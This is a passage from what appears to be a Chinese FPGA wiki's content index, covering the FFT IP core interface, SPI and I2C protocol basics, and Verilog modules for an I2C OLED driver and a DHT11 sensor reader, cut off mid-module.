oder就是按照变化后的顺序直接输出，是倒序输出，需要自己后续处理， **optional output fileds :**选项输出字段 xk_index:FFT 变幻的结果索引，在m_axis_data_user中有相应的字段。 OVFLO是变换中溢出的指示信号，对应event_fft_overflow. 第三页 一般不需要变动 1: 数据2: 相位因子3: 重排序缓冲。4: 复数乘法器5: 蝶形运算单元。 接口定义 名称 方向 说明 aclk 输入 模块工作时钟，上升沿有效 aclken 输入 时钟使能信号，高电平有效，低电平时内核暂停工作，可通过此信号降低内核运行的最大时钟频率 aresetn 输入 低电平同步复位信号，优先级高于aclken,低电平至少持续两个时钟周期 配置 - s_axis_config_tvalid 输入 配置通道的tvalid,由外部主机断言以表示它能够提供数据 s_axis_config_tready 输出 配置通道的tready,由内核断言以表示它已准备好接收数据 s_axis_config_tdata 输入 配置通道的tdata,携带配置信息，包括NFFT、FWD&#x2F;INV、CP LENZ和SCALE SCH 输入数据 - s_axis_data_tvalid 输入 输入数据通道tvalid,由外部主机断言以表示它能够提供数据 s_axis_data_tready 输出 输入数据通道tready,由内核断言以表示它能够接收数据 s_axis_data_tdata 输入 输入数据通道tdata,由外部主机提供待处理的数据 s_axis_data_tlast 输入 由外部主机断言表示最后一组数据，只在生成事件event_tlast_unexpected和event tlast_missing时，内核才使用它 输出数据 - m_axis_data_tvalid 输出 输出数据通道tvalid,由内核断言表示它能够提供数据 m_axis_data_tready 输入 输出数据通道tready,由外部主机断言表示它能够接收数据 m_axis_data_tdata 输出 输出数据通道tdata,由内核提供FFT后的数据 m_axis_data_tuser 输出 输出数据通道tuser,由内核提供XK INDEX, OVFLO, BLK EXP信息 m_axis_data_tlast 输出 数据数据通道tlast,由内核断言表示最后一个输出数据"},{"title":"RS485串口协议","path":"/wiki/FPGA/常用协议/RS485串口协议.html","content":"开发中···RS485串口协议.md"},{"title":"SPI协议","path":"/wiki/FPGA/常用协议/SPI协议.html","content":"前言串行接口各有千秋，并行通信千篇一律 基础知识1. SPI通信协议 SPI（串行外设接口）以其高速度而著称，使其成为快速通信的首选。SPI通讯协议是一种主从通信方式，是Motorola公司提出的一种同步串行接口技术，是一种高速、全双工、同步通信总线，在芯片中只占用四根管脚用来控制及数据传输。与 I2C 不同，SPI 使用四线工作：MISO（主输入从输出）、MOSI（主输出从输入）、SCK（串行时钟）和 SS（从选择），允许全双工通信（发送和同时接收）。尽管简单且速度快，但 SPI 比 I2C 需要更多的引脚，这可能是电路设计中需要考虑的一个因素。 优点： 高速：SPI通信速度较快，适用于对速度要求较高的应用。 全双工：SPI支持全双工通信，可以同时进行数据发送和接收。 简单：SPI的通信协议相对简单，适用于快速开发和实现。 缺点： 连线复杂：SPI需要多根线进行连接，可能会增加硬件设计的复杂性。 长距离传输受限：SPI的传输距离受到限制，过长的线路可能导致信号衰减和干扰。 主从模式限制：SPI通常采用主从模式，主设备数量受限，不适用于多主设备场景。 没有应答机制和确认数据是否接收，在数据可靠性上有一定的缺陷（与I2C相比） 应用案例： SPI 非常适合需要快速可靠的数据传输的情况，例如 TFT 显示器、SD 存储卡和无线通信模块。然而，在具有许多从站的复杂系统中，其有效性会降低。同时也应用于例如EEPROM、Flash、RTC、ADC、DSP等模块中。 2. 设备引脚的功能描述 SCK（Serial Clock）：时钟信号线，用于同步通讯数据； MOSI（Master Output ,Slave Input）:主设备输出&#x2F;从设备输入引脚； MISO（Master Input,Slave Output）：主设备输入&#x2F;从设备输出引脚； CS_N：片选信号线;选中我们的从设备，低电平有效 3. SPI协议层 在通信过程中，I2C是使用地址进行寻址，而我们这里的SPI没有地址，而是采用片选信号线来选择与哪一个从机进行通信，片选信号线被拉低则表示被选中。 SPI一共与4中通信模式，这四种通信模式是由CPOL（时钟极性）和CPHA（时钟相位）共同决定的： SCK(CPOL&#x3D;0,CPHA&#x3D;0) SCK(CPOL&#x3D;0,CPHA&#x3D;1) SCK(CPOL&#x3D;1,CPHA&#x3D;0) SCK(CPOL&#x3D;1,CPHA&#x3D;1) CPOL: 表示当片选信号处于高电平空闲状态的时候，SCK的电平。当为0的时候，SCK在空闲状态为低电平，反之则为高电平 CPHA：表示是在奇数还是偶数位采样，当为0的时候，在奇数位采样，反之则在偶数位置采样 具体如下图所示"},{"title":"以太网通信","path":"/wiki/FPGA/常用协议/以太网通信.html","content":"开发中···以太网通信.md"},{"title":"I2C协议","path":"/wiki/FPGA/常用协议/I2C协议.html","content":"本次使用开发环境： 软件：Quartus II 64-Bit 开发板及芯片型号：至芯–EP4CE6E22C8N 1.2V 1. 基础知识1. I2C（IIC）通讯协议I2C通讯协议（Inter - Intergrated Circuit）是由Philips公司开发的一种简单、双向二线同步串行总线，只需要两根先就可以在连接于总线上的器件之间传送信息。 I2C通讯协议和通信接口在很多工程中与广泛的应用，如数据采集领域的串行AD，图像处理领域的摄像头配置，工业控制领域的X射线管配置等等。除此之外，由于I2C协议占用的引脚特别少，硬件实现简单，可扩展性强，现在被广泛使用在系统内多个集成电路（IC）间的通讯。同时也通常用于连接低速设备，如传感器、存储器和其他外设。它使用两根线（SCL和SDA）来实现双向通信，具有地址定向性和主从模式。 I2C工作时动图展示 优点： 多设备支持：I2C支持多个设备连接到同一总线上，每个设备都有唯一的地址。 简单：I2C协议相对简单，易于实现和调试。 低功耗：在空闲状态时，显示高阻态，I2C总线上的器件可以进入低功耗模式，节省能量。（空闲状态下，IIC设备端口处于高阻态，所以IIC总线空闲时刻也就是高电平 仲裁：总线上可以连接多个从机，也可以连接多个主机，当多个主机同时使用总线时，为了防止数据发生冲突，会使用仲裁的方式来决定哪个设备使用总线 速度：IIC具有3个传输模式，在标准模式下，传输速度为100kb&#x2F;s。在快速模式下，速度为400kb&#x2F;s。最后是高速模式，速度可以达到3.4MB&#x2F;s。当前的大多数IIC设备仅支持标准模式和快速模式。 缺点： 速度较慢：I2C通信速度较低，适用于低速设备。 受限制：I2C的总线长度和设备数量受到限制，过长的总线可能导致通信问题。 冲突：当多个设备尝试同时发送数据时，可能会发生冲突，需要额外的冲突检测和处理机制。 应用案例： 就其应用而言，连接方面，I2C在需要简单且经济的通信环境中表现出色。它尤其擅长在小型传感器、LCD 屏幕和 RTC（实时时钟）模块中使用。此外，I2C 由于其在紧凑电路中的效率，在温度控制设备、电池管理系统和 LED 控制器中很有用。但是，在需要快速或长距离数据传输的项目中，最好选择其他协议。 读写等详细的通信过程可参考下文： 老宇哥带你玩转 ESP32：07 I2C协议，看这一篇就够了 （点击阅读） 2. I2C物理层I2C物理层 I2C_SCL：串行时钟线，用于同步通讯数据； I2C_SDA： 双向串行数据线，传输通讯数据； 3. I2C协议层I2C协议层示意图 在这个示意图中，包含4个状态： 1： 总线空闲状态 2： 起始信号 3： 数据读写状态 4： 停止信号 局部放大图 在SCL为高电平的时候，进行数据的写入，低电平的时候，进行数据的更新。 当我们的从机设备正确接受到我们发送的信号的时候，会把SDA数据线拉低，称为响应位，表示向主机发送一个单比特的应答信号。 关于器件的地址的内容器件地址 x 器件地址被定义为7Bit的数据，器件厂商在出厂的时候就将地址设置好了，用户不能进行自己更改，但是有的厂商如上图所示，其中高4位是固定的，但是后3位没有被写入，这样的情况是允许用户自行设置的。 EEPROM图 可以在这里看到，根据上面的两行图像，可以确定这个芯片的I2C地址为10100_000，因为A0、A1、A2都是低电平。 最后一位为读写控制位，0表示写入，1表示读取。 举例：如果要让这个芯片处于读取状态，使用I2C协议的地址则为：10100_000_1 4. 数据传输流程I²C协议中判断数据接收设备的基本步骤： 地址分配：每个连接到I²C总线的设备都有一个唯一的地址。这个地址在设备制造时被设定，并且通常通过硬件方式设置。 开始条件：在数据传输开始之前，主机设备会发送一个开始条件，这通常涉及到SDA（数据线）和SCL（时钟线）的特定电平变化。 发送地址：主机设备随后会在SDA线上发送目标设备的7位地址，加上一个额外的读&#x2F;写位（R&#x2F;W位）。这个位指示了接下来的操作是读取（1）还是写入（0）。 确认应答：当地址和R&#x2F;W位被发送后，目标设备需要在下一个时钟脉冲的开始时将SDA线拉低，以表示它已经接收到了地址并且准备好进行通信。这个过程称为应答（ACK）。 数据传输：一旦接收到应答，主机设备就会开始发送数据。如果是写入操作，主机发送数据；如果是读取操作，从设备发送数据。 非应答（NACK）：如果目标设备不是预期的接收者，或者由于其他原因无法接收数据，它会在下一个时钟脉冲的开始时不拉低SDA线，表示非应答。 停止条件：数据传输完成后，主机设备会发送一个停止条件，这涉及到SDA和SCL线的特定电平变化，以结束数据传输。 多主机环境：在多主机环境中，如果有多个主机尝试同时控制总线，它们会使用仲裁机制来决定哪个主机获得控制权。仲裁是基于发送的数据位，如果两个主机尝试发送不同的位，发送0的主机会放弃控制权。 2. IIC驱动7Pin 0.96寸 OLED显示屏实例1. 硬件修改在驱动显示屏时，显示屏默认使用SPI协议驱动，要改为IIC协议驱动需要将硬件电路进行简单的修改，具体就是： 将背面R3电阻移动到R4的 位置 短接R8电阻 改造好之后，不能象原生的IIC屏幕那样接4根线即可，必须将7个管脚都要接线，否则可能没有任何显示。管脚处理： 1、CS 脚接地。 2、DC 脚的处理:在 IIC 通信中 DC 的高低电平是用来选择 IIC 通信地址的;当 DC 接地时 IIC从机地址为:0x78,当 DC 接高电平时 IIC 地址为 0x7A;测试程序中所用的为 0x78; 通常直接将 DC 接地 3、关于 RES 的处理。RES 这个脚是 OLED 屏的复位脚;大家在用 OLED 屏的时候会发现;所 有 OLED 本身都会有一个复位脚;因为 OLED 在被操作之前需要在将寄存作一次复位;然后才能对期进行初始货操作;否则 OLED 可能会出现水稳定的情况。RES 处理方案： 1&gt; 简单的验证办法:将RES接电源正;这样可以把屏点亮;但是会不稳定，在快速测试时可以这么操作 2&gt; 将RES脚与开发板的复位脚连接;通过开发板的复位来对OLED进行复位 3&gt; 通过一个IO脚来对OLED进行复位，这个操作放在对屏初始化之前;先将RES拉低延迟 200ms 左右;然后再拉高一直处于高电平状态 4&gt; 通过一个RC复位电路来控制RES 4、D0 为 IIC 时钟线或者SCK为时钟线， 5、D1 为 IIC 数据线或者SDA为数据线； 6、GND 为接地线， 7、VDD 为电源线； 2.OLED上的驱动部分:OLED屏幕有三种刷新方式分别为页地址模式, 水平地址模式和垂直地址模式,。水平地址模式和垂直地址模式可以在一页(一列)写完后自动换页(列)所以在水平地址寻址或者垂直地址寻址模式下，只要源源不断的发送数据即可 页地址模式 水平地址模式 垂直地址模式 3. OLED关键命令介绍0xAE&#x2F;0xAF: 对应着开启OLED显示和关闭OLED显示0x20-0x22: 对应着上面的三种OLED数据存储模式，默认为0x22，模式一0x00-0x0F: 设置列地址的低四位，默认为0x00，0x10-0x1F: 设置列地址的高四位，默认为0x10，0xB0-0xB7: 设置page，第四位表示page。 IIC数据格式 ：OLED地址 + 命令 &#x2F; 数据 + 值。 OLED地址，就是IIC协议中的从机地址，我这里是0x78。 命令&#x2F;数据中，0x00表示接下来的值代表命令，0x40表示接下的值表示数据，存入GRMA。 值，具体的命令或者数据 always@(*) begin case(Init_index) &#x27;d0: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hAE&#125;; //OLED地址 + 命令 + 值。** &#x27;d1: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h00&#125;; &#x27;d2: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h10&#125;; &#x27;d3: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h40&#125;; &#x27;d4: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hB0&#125;; &#x27;d5: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h81&#125;; &#x27;d6: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hFF&#125;; &#x27;d7: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hA1&#125;; &#x27;d8: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hA6&#125;; &#x27;d9: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hA8&#125;; &#x27;d10: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h3F&#125;; &#x27;d11: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hC8&#125;; &#x27;d12: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hD3&#125;; &#x27;d13: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h00&#125;; &#x27;d14: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hD5&#125;; &#x27;d15: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h80&#125;; &#x27;d16: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hD8&#125;; &#x27;d17: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h05&#125;; &#x27;d18: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hD9&#125;; &#x27;d19: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hF1&#125;; &#x27;d20: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hDA&#125;; &#x27;d21: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h12&#125;; &#x27;d22: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hDB&#125;; &#x27;d23: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h30&#125;; &#x27;d24: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h8D&#125;; &#x27;d25: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h14&#125;; &#x27;d26: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hAF&#125;; default: Init_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hAE&#125;; endcase end 3. IIC驱动4Pin OLED显示器显示DHT11温湿度数据3.1 字模设计 3.2 程序设计main.v module main( input sys_clk, input rst_n, inout dht11, output OLED_SCL, inout OLED_SDA ); wire dht11_done; reg dht11_req; wire[7:0] tempH; wire[7:0] tempL; wire[7:0] humidityH; wire[7:0] humidityL; localparam S_DELAY =\t&#x27;d55_000_000; reg[35:0] delay; always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) delay &lt;= &#x27;d0; else if(dht11_done == 1&#x27;b1) delay &lt;= &#x27;d0; else if(delay == S_DELAY) delay &lt;= delay; else delay &lt;= delay + 1&#x27;b1; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) dht11_req &lt;= 1&#x27;b0; else if(delay == S_DELAY) dht11_req &lt;= 1&#x27;b1; else dht11_req &lt;= 1&#x27;b0; end DHT11 DHT11HP( .sys_clk (sys_clk), .rst_n (rst_n), .dht11_req (dht11_req), //dht11数据采集请求 .dht11_done (dht11_done), //dht11数据采集结束 .dht11_error\t(), //dht11数据采集正确与否判断 1为错误 .tempH (tempH), //温度数据整数 .tempL (tempL), //温度数据小数 .humidityH (humidityH), //温度数据整数 .humidityL (humidityL), //温度数据小数 .dht11 (dht11) ); OLED_Top OLED_TopHP( .sys_clk (sys_clk), .rst_n (rst_n), .dht11_done (dht11_done), .tempH (tempH), //温度数据整数 .tempL (tempL), //温度数据小数 .humidityH (humidityH), //温度数据整数 .humidityL (humidityL), //温度数据小数 //OLED IIC .OLED_SCL\t(OLED_SCL), .OLED_SDA\t(OLED_SDA) ); endmodule iic.v`timescale 1ns/1ps module IIC_Driver( input sys_clk, /*系统时钟*/ input rst_n, /*系统复位*/ output IICSCL, /*IIC 时钟输出*/ inout IICSDA, /*IIC 数据线*/ input[15:0] IICSlave, /*从机 8bit的寄存器地址 + 8bit的从机地址*/ input IICWriteReq, /*IIC写寄存器请求*/ output IICWriteDone, /*IIC写寄存器完成*/ input[7:0] IICWriteData, /*IIC发送数据 8bit的数据*/ input IICReadReq, /*IIC读寄存器请求*/ output IICReadDone, /*IIC读寄存器完成*/ output[7:0] IICReadData /*IIC读取数据*/ ); /*IIC 状态*/ localparam IIC_IDLE = 6&#x27;b000_001; /*空闲态*/ localparam IIC_START = 6&#x27;b000_010; /*起始态*/ localparam IIC_WRDATA = 6&#x27;b000_100; /*写数据态*/ localparam IIC_RDDATA = 6&#x27;b001_000; /*读数据态*/ localparam IIC_ACK = 6&#x27;b010_000; /*应答态*/ localparam IIC_STOP = 6&#x27;b100_000; /*停止态*/ localparam IIC_Pre = &#x27;d100; /*iiC分频*/ reg[5:0] state , next_state; reg[21:0] IICCnt; /*IIC计数器*/ reg[3:0] IICBitCnt; /*IIC数据发送个数计数*/ reg[1:0] IICACKStopCnt; /*IIC ack stop应答计数*/ reg[2:0] IICSendBytes; /*IIC 发送字节计数*/ reg[15:0] IICSlaveReg; /*从机地址+寄存器数据*/ reg[7:0] IICReadDataReg; /*读取到的数据*/ reg IICWriteReqReg; reg iictx; /*iic发送数据引脚*/ reg iicCLK; /*iic时钟信号引脚*/ assign IICSDA = (state == IIC_RDDATA || (state == IIC_ACK)) ? 1&#x27;bz : iictx; /*iic为读数据或者应答的时候，输出为高阻态*/ assign IICSCL = iicCLK; assign IICReadData = IICReadDataReg; assign IICReadDone = (state != next_state &amp;&amp; state == IIC_STOP) ? 1&#x27;b1 : 1&#x27;b0; assign IICWriteDone = (state != next_state &amp;&amp; state == IIC_STOP) ? 1&#x27;b1 : 1&#x27;b0; always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) IICWriteReqReg &lt;= 1&#x27;b0; else if(IICWriteDone == 1&#x27;b1) IICWriteReqReg &lt;= 1&#x27;b0; else if(IICWriteReq == 1&#x27;b1) IICWriteReqReg &lt;= 1&#x27;b1; else IICWriteReqReg &lt;= IICWriteReqReg; end always @(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) state &lt;= IIC_IDLE; else state &lt;= next_state; end /*状态机*/ always @(*) begin case(state) IIC_IDLE: if(IICWriteReq == 1&#x27;b1 || IICReadReq == 1&#x27;b1) next_state &lt;= IIC_START; else next_state &lt;= IIC_IDLE; IIC_START: if(IICCnt == (IIC_Pre * &#x27;d2)) next_state &lt;= IIC_WRDATA; else next_state &lt;= IIC_START; IIC_WRDATA: if(IICBitCnt == &#x27;d8 /*&amp;&amp; IICCnt == IIC_Pre /4 */&amp;&amp; iicCLK == 1&#x27;b0) next_state &lt;= IIC_ACK; else next_state &lt;= IIC_WRDATA; IIC_RDDATA: if(IICBitCnt == &#x27;d8 &amp;&amp; IICCnt == IIC_Pre /4 &amp;&amp; iicCLK == 1&#x27;b0) next_state &lt;= IIC_ACK; else next_state &lt;= IIC_RDDATA; IIC_ACK: if(IICACKStopCnt == &#x27;d1 /*&amp;&amp; IICCnt == IIC_Pre /4 */&amp;&amp; iicCLK == 1&#x27;b0) if(IICSendBytes == &#x27;d2) if(/*IICWriteReq*/IICWriteReqReg == 1&#x27;b1) /*三个字节发送完成，进入停止态*/ next_state &lt;= IIC_STOP; else next_state &lt;= IIC_RDDATA; else if(IICSendBytes == &#x27;d2 &amp;&amp; IICReadReq == 1&#x27;b1) next_state &lt;= IIC_START; else if(IICSendBytes == &#x27;d4) next_state &lt;= IIC_STOP; else next_state &lt;= IIC_WRDATA; else next_state &lt;= IIC_ACK; IIC_STOP: if(IICACKStopCnt == &#x27;d1 &amp;&amp; IICCnt == IIC_Pre/4 &amp;&amp; iicCLK == 1&#x27;b1) next_state &lt;= IIC_IDLE; else next_state &lt;= IIC_STOP; default: next_state &lt;= IIC_IDLE; endcase end /*IIC 发送字节计数*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) IICSendBytes &lt;= &#x27;d0; else if(state == IIC_IDLE) IICSendBytes &lt;= &#x27;d0; else if(state == IIC_ACK) if(next_state != state) IICSendBytes &lt;= IICSendBytes + 1&#x27;b1; else IICSendBytes &lt;= IICSendBytes; else IICSendBytes &lt;= IICSendBytes; end /*IIC分频计数*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) IICCnt &lt;= &#x27;d0; else if(IICCnt == IIC_Pre &amp;&amp; state != IIC_START) IICCnt &lt;= &#x27;d0; else if(IICCnt == (IIC_Pre *&#x27;d2) &amp;&amp; state != IIC_START) IICCnt &lt;= &#x27;d0; else if(state != next_state) IICCnt &lt;= &#x27;d0; else if(state == IIC_START) IICCnt &lt;= IICCnt + 1&#x27;b1; else if(state == IIC_WRDATA ) IICCnt &lt;= IICCnt + 1&#x27;b1; else if(state == IIC_RDDATA) IICCnt &lt;= IICCnt + 1&#x27;b1; else if(state == IIC_ACK) IICCnt &lt;= IICCnt + 1&#x27;b1; else if(state == IIC_STOP) IICCnt &lt;= IICCnt + 1&#x27;b1; end /*IIC发送bit计数*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) IICBitCnt &lt;= &#x27;d0; else if(state == IIC_IDLE || state == IIC_ACK) IICBitCnt &lt;= &#x27;d0; else if(state == IIC_WRDATA &amp;&amp; IICCnt == (IIC_Pre /2)) if(iicCLK == 1&#x27;b1) IICBitCnt &lt;= IICBitCnt + 1&#x27;b1; else IICBitCnt &lt;= IICBitCnt; else if(state == IIC_RDDATA &amp;&amp; IICCnt == (IIC_Pre /2)) if(iicCLK == 1&#x27;b1) IICBitCnt &lt;= IICBitCnt + 1&#x27;b1; else IICBitCnt &lt;= IICBitCnt; else IICBitCnt &lt;= IICBitCnt; end /*IIC ack stop应答计数*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) IICACKStopCnt &lt;= &#x27;d0; else if(state != next_state) IICACKStopCnt &lt;= &#x27;d0; else if((state == IIC_ACK || state == IIC_STOP) &amp;&amp; IICCnt == (IIC_Pre /2)) if(iicCLK == 1&#x27;b1) IICACKStopCnt &lt;= IICACKStopCnt + 1&#x27;b1; else IICACKStopCnt &lt;= IICACKStopCnt; else if(state == IIC_ACK || state == IIC_STOP) IICACKStopCnt &lt;= IICACKStopCnt; else IICACKStopCnt &lt;= &#x27;d0; end /*IIC从机信息控制*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) IICSlaveReg &lt;= &#x27;d0; else if((IICWriteReq == 1&#x27;b1 || IICReadReq == 1&#x27;b1) &amp;&amp; state == IIC_IDLE) /*请求来时，保存信息*/ IICSlaveReg &lt;= IICSlave; else if(state == IIC_ACK &amp;&amp; state != next_state) /*每发送完成一字节，就调换数据，始终发送的是低8位*/ if(IICSendBytes == &#x27;d2) IICSlaveReg &lt;= &#123;IICSlaveReg[7:0],IICSlaveReg[15:8]&#125; + 1&#x27;b1; else IICSlaveReg &lt;= &#123;IICSlaveReg[7:0],IICSlaveReg[15:8]&#125;; else IICSlaveReg &lt;= IICSlaveReg; end /*IIC 时钟控制*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) iicCLK &lt;= 1&#x27;b1; else if(state == IIC_START &amp;&amp; IICCnt == (IIC_Pre*2)) /*开始结束时，拉低时钟线*/ iicCLK &lt;= 1&#x27;b0; else if(state == IIC_START &amp;&amp; IICCnt &gt; IIC_Pre) iicCLK &lt;= 1&#x27;b1; else if(state == IIC_START &amp;&amp; IICCnt == IIC_Pre) iicCLK &lt;= iicCLK; else if(state == IIC_WRDATA &amp;&amp; IICCnt == IIC_Pre) /*发送数据，依次取反时钟线*/ iicCLK &lt;= ~iicCLK; else if(state == IIC_RDDATA &amp;&amp; IICCnt == IIC_Pre) /*接收数据，依次取反时钟线*/ iicCLK &lt;= ~iicCLK; else if(state == IIC_ACK &amp;&amp; IICCnt == IIC_Pre) iicCLK &lt;= ~iicCLK; else if(state == IIC_STOP &amp;&amp; IICCnt == IIC_Pre) /*在停止态时，IICCnt时，直接拉高iicCLK*/ iicCLK &lt;= 1&#x27;b1; end /*iic 发送控制*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) iictx &lt;= 1&#x27;b1; else if(state == IIC_START &amp;&amp; IICCnt == (IIC_Pre/2)) /*开始，iic数据线拉低*/ iictx &lt;= 1&#x27;b0; else if(state == IIC_START &amp;&amp; IICCnt == IIC_Pre/4) /*开始，iic数据线拉低*/ iictx &lt;= 1&#x27;b1; else if(state == IIC_WRDATA &amp;&amp; IICCnt == IIC_Pre / 2) /*iic发送数据*/ if(iicCLK == 1&#x27;b0 &amp;&amp; IICSendBytes == &#x27;d2 &amp;&amp; (IICWriteReq == 1&#x27;b1 || IICWriteReqReg == 1&#x27;b1)) iictx &lt;= IICWriteData[&#x27;d7-IICBitCnt]; else if(iicCLK == 1&#x27;b0) iictx &lt;= IICSlaveReg[&#x27;d7-IICBitCnt]; else iictx &lt;= iictx; else if(state == IIC_ACK) iictx &lt;= 1&#x27;b0; else if(state == IIC_STOP &amp;&amp; IICCnt == (IIC_Pre)) if(iicCLK == 1&#x27;b1) iictx &lt;= 1&#x27;b1; else iictx &lt;= iictx; else if(state == IIC_IDLE) iictx &lt;= 1&#x27;b1; end /*iic 读取数据控制*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) IICReadDataReg &lt;= &#x27;d0; else if(state == IIC_RDDATA &amp;&amp; IICCnt == IIC_Pre / 2) if(iicCLK == 1&#x27;b1) IICReadDataReg &lt;= &#123;IICReadDataReg[6:0],IICSDA&#125;; else IICReadDataReg &lt;= IICReadDataReg; else IICReadDataReg &lt;= IICReadDataReg; end endmodule dht11.v /*dht11温湿度数据获取模块*/ module DHT11( input sys_clk, input rst_n, input dht11_req, //dht11数据采集请求 output dht11_done, //dht11数据采集结束 output dht11_error, //dht11数据采集正确与否判断 1为错误 output[7:0] tempH, //温度数据整数 output[7:0] tempL, //温度数据小数 output[7:0] humidityH, //温度数据整数 output[7:0] humidityL, //温度数据小数 inout dht11 ); //时钟为50MHZ，20ns localparam TIME18ms = &#x27;d1000_099; //开始态的拉低18ms,900_000个时钟周期，这里适当的延长了拉低时间。 localparam TIME35us = &#x27;d1_750; //数据传输过程中，数据0拉高的出现 localparam S_IDLE = &#x27;d0; //空闲态 localparam S_START_FPGA = &#x27;d1; //FPGA请求采集数据开始 localparam S_START_DHT11 = &#x27;d2; //DHT11开始请求应答 localparam S_DATA = &#x27;d3;\t//数据传输 localparam S_STOP = &#x27;d4; //数据结束 localparam S_DOEN = &#x27;d5; //数据采集完成 reg[2:0] state , next_state; reg[22:0] DHT11_Cnt; //计时器 reg[5:0] DHT11Bit_Cnt; // 接收dht11传输bit数计数 reg[39:0] dht11_data; reg dht11_d0 , dht11_d1; wire dht11_negedge; //检测dht11的上下边沿 assign dht11_negedge = (~dht11_d0) &amp; dht11_d1; assign dht11 = (state == S_START_FPGA &amp;&amp; (DHT11_Cnt &lt;= TIME18ms)) ? 1&#x27;b0 : 1&#x27;bz; assign dht11_done = (state == S_DOEN) ? 1&#x27;b1 : 1&#x27;b0; assign tempH = dht11_data[23:16]; assign tempL = dht11_data[15:8]; assign humidityH = dht11_data[39:32]; assign humidityL = dht11_data[31:24]; always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin dht11_d0 &lt;= 1&#x27;b1; dht11_d1 &lt;= 1&#x27;b1; end else begin dht11_d0 &lt;= dht11; dht11_d1 &lt;= dht11_d0; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) state &lt;= S_IDLE; else state &lt;= next_state; end always@(*) begin case(state) S_IDLE: if(dht11_req == 1&#x27;b1) //数据采集请求过来进入开始态 next_state &lt;= S_START_FPGA; else next_state &lt;= S_IDLE; S_START_FPGA: if((DHT11_Cnt &gt;= TIME18ms) &amp;&amp; dht11_negedge == 1&#x27;b1) //FPGA请求结束结束 next_state &lt;= S_START_DHT11; else next_state &lt;= S_START_FPGA; S_START_DHT11: if((DHT11_Cnt &gt; TIME35us) &amp;&amp; dht11_negedge == 1&#x27;b1) //延时一段时间后，通过判断dht11总线的下降沿，是否结束响应 next_state &lt;= S_DATA; else next_state &lt;= S_START_DHT11; S_DATA: if(DHT11Bit_Cnt == &#x27;d39 &amp;&amp; dht11_negedge == 1&#x27;b1) //接收到40bit数据后，进入停止态 next_state &lt;= S_STOP; else next_state &lt;= S_DATA; S_STOP: if(DHT11_Cnt == TIME35us + TIME35us) //数据传输完成后，等待总线拉低50us,这里是70us next_state &lt;= S_DOEN; else next_state &lt;= S_STOP; S_DOEN: next_state &lt;= S_IDLE; default: next_state &lt;= S_IDLE; endcase end /*计数模块*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) DHT11_Cnt &lt;= &#x27;d0; else if(state != next_state) //状态变换的时候，计时器置0 DHT11_Cnt &lt;= &#x27;d0; else if(state == S_START_FPGA) DHT11_Cnt &lt;= DHT11_Cnt + 1&#x27;b1; else if(state == S_START_DHT11) DHT11_Cnt &lt;= DHT11_Cnt + 1&#x27;b1; else if(state == S_DATA &amp;&amp; dht11_negedge == 1&#x27;b0) //数据的时候，只需要在高电平的时候计数 DHT11_Cnt &lt;= DHT11_Cnt + 1&#x27;b1; else if(state == S_STOP) DHT11_Cnt &lt;= DHT11_Cnt + 1&#x27;b1; else DHT11_Cnt &lt;= &#x27;d0; end /*接收数据存储*/ always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) dht11_data &lt;= &#x27;d0; else if(state == S_DATA) if((DHT11_Cnt &lt;= (TIME35us + &#x27;d2500)) &amp;&amp; dht11_negedge == 1&#x27;b1) 